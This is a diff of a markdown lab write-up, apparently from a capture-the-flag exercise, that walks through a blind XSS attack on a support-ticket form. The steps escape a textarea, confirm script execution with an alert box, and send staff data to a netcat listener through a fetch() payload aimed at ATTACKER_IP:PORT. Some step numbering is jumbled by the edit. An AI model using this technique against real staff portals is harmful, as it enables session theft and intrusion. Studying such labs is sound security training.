@@ -166,12 +166,12 @@ The word script  gets removed from your payload, that's because there is a filte
 **Target:** Acme IT Support — Support Ticket “Create Ticket” functionality.  
 **Action:** Created tickets with payloads that escaped the `textarea` and executed JS in the staff portal when the ticket was viewed.  
 **Goal:** Demonstrate blind XSS that triggers when staff view the ticket (useful for catching admin-only functionality).  
-## Step-by-step procedure
+## Step-by-step procedure##
 
-**1.** Create a lab user account via **Customers → Signup here**.  
+**1.** **Create a lab user account via** **Customers → Signup here**.  
  Log in and go to **Support Tickets → Create Ticke
 
-**2.** Confirm how input is reflected
+**2. Confirm how input is reflected**
 1. Create a ticket with the content `test`.  
 2. Submit and open the ticket.  
 3. View page source (right click → View Page Source) and confirm the ticket content is placed inside a `<textarea>` element.
@@ -183,24 +183,7 @@ The word script  gets removed from your payload, that's because there is a filte
 
 2. Submit the ticket. Open the ticket. An alert box with `THM` should pop up (this confirms JavaScript execution).
 
-
----
-4. Prepare an exfiltration listener (Netcat) on AttackBox
-**On the AttackBox terminal**, start Netcat listener on port `9001`:
-```bash
-nc -nlvp 9001
-
--n skip DNS lookups
-
--l listen mode
-
--v verbose
-
--p port (9001)
-
----
-
-##6. Build an exfiltration payload##
+**4.Build an exfiltration payload**
 
 Template — replace ATTACKER_IP:PORT with your AttackBox IP and listening port:
 
@@ -225,3 +208,19 @@ fetch() sends the data back to your listener
 ![payload Example](Screenshot%202025-09-17%20233037.jpg)
 
 ---
+
+4. Prepare an exfiltration listener (Netcat) on AttackBox
+**On the AttackBox terminal**, start Netcat listener on port `9001`:
+```bash
+nc -nlvp 9001
+
+-n skip DNS lookups
+
+-l listen mode
+
+-v verbose
+
+-p port (9001)
+
+---
+
